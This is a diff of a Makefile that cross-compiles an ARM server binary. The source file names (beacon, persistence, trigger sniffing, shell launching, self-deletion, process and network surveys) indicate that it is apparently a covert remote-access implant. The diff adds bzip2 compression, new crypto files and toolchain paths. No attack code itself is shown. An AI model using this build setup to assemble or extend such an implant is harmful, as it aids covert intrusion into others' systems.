@@ -10,10 +10,11 @@
 #------------------------------------------------
 
 ARCH=arm
-TOOLROOT=arm-unknown-linux-gnueabi-
-#BUILDTOOLS=$(BUILDROOT)/bin
-UCLIBC_HDRS=/include
-UCLIBC_LIBS=/lib
+BUILDROOT=/opt/arm-devel
+BUILDTOOLS=$(BUILDROOT)/usr/bin
+TOOLROOT=$(BUILDTOOLS)/arm-unknown-linux-gnueabi-
+UCLIBC_HDRS=$(BUILDTOOLS)/include
+UCLIBC_LIBS=$(BUILDTOOLS)/lib
 CC=${TOOLROOT}gcc
 
 STRIP=${TOOLROOT}strip
@@ -29,15 +30,19 @@ SERVER=$(SERVER_BASENAME)-$(ARCH)
 POLARSSL = polarssl
 INCLUDES = -I $(UCLIBC_HDRS) -I$(POLARSSL)/include -I../libs
 LIBPOLARSSL = $(POLARSSL)/library/libpolarssl.a
+BZIP2 = libbzip2
+LIBBZIP2 = libbzip2/libbz2.a
 
-SERVER_SRCS = beacon.c run_command.c persistence.c \
-	survey_mac.c survey_uptime.c trigger.c daemonize.c \
-	main.c init_strings.o string_utils.o tiny_crc16.c \
-	trigger_b64.c trigger_exec.c trigger_payload.c trigger_sniff.c \
-	threads.c connect_shell.c shell.c $(POLARSSL)/crypto.c $(LIBPOLARSSL)
+SERVER_SRCS = beacon.c persistence.c launchshell.c \
+        shuffle.c twofish.c farm9crypt.c jshell.c \
+        survey_mac.c survey_uptime.c trigger_listen.c trigger_callback_session.c daemonize.c \
+        main.c init_strings.o string_utils.o tiny_crc16.c \
+        trigger_b64.c trigger_payload.c trigger_sniff.c run_command.c \
+        client_session.c threads.c self_delete.c $(POLARSSL)/crypto.c $(LIBPOLARSSL) \
+        get_data.c process_list.c ifconfig.c netstat_rn.c netstat_an.c compression.c $(LIBBZIP2)
 
 #OBJECTS = $(SRCS:%.c=%.o)
-CFLAGS += -L$(UCLIBC_LIBS) -Os -W -Wall -D_IH_X86_BUILD -lpthread
+CFLAGS += -L$(UCLIBC_LIBS) -Os -W -Wall -D_IH_X86_BUILD -lpthread -lutil
 CFLAGS += $(INCLUDES) -DLINUX -DUCLIBC
 DBGFLAGS += -DDEBUG -D_DEBUG -g
 
@@ -52,6 +57,9 @@ endif
 .PHONY: all
 all: $(LIBPOLARSSL) $(SERVER) $(SERVER)-dbg
 
+$(LIBBZIP2):
+	cd $(BZIP2) && $(MAKE) -f Makefile.$(ARCH)
+
 $(LIBPOLARSSL): strings
 	cd $(POLARSSL)/library && $(MAKE) -f Makefile.$(ARCH)
 #	cd $(POLARSSL)/library && $(MAKE) -f Makefile.$(ARCH) && cd ../../../server
@@ -62,12 +70,12 @@ debug: $(LIBPOLARSSL) $(SERVER)-dbg
 .PHONY: release
 release: $(LIBPOLARSSL) $(SERVER)
 
-$(SERVER): strings $(LIBPOLARSSL) 
+$(SERVER): strings $(LIBPOLARSSL) $(LIBBZIP2)
 	$(CC) $(CFLAGS) $(COMMON_SRCS) $(SERVER_SRCS) -L$(LIB) -o $(BIN)/$(SERVER)
 #	$(STRIP) $(BIN)/$(SERVER)
 	md5sum $(BIN)/$(SERVER) > $(BIN)/$(SERVER).md5
 
-$(SERVER)-dbg: strings $(LIBPOLARSSL)
+$(SERVER)-dbg: strings $(LIBPOLARSSL) $(LIBBZIP2)
 	$(CC) $(CFLAGS) $(DBGFLAGS) $(COMMON_SRCS) $(SERVER_SRCS) -L$(LIB) -o $(BIN)/$(SERVER)-dbg
 	md5sum $(BIN)/$(SERVER)-dbg > $(BIN)/$(SERVER)-dbg.md5
 
